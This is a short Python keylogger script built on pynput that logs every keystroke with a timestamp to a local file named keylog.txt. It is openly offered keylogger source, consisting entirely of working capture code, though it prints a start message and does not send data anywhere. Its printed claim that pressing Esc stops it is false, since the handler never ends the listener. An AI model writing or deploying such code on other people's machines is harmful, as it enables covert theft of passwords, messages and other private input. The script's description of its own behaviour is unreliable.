from pynput.keyboard import Key, Listener
import logging

# Set up logging to save keystrokes to a file
logging.basicConfig(filename='keylog.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

def on_press(key):
    # Log the key pressed
    logging.info(str(key))

def main():
    print("Keylogger started. Press 'Esc' to stop and exit.")

    # Set up the listener for keystrokes
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
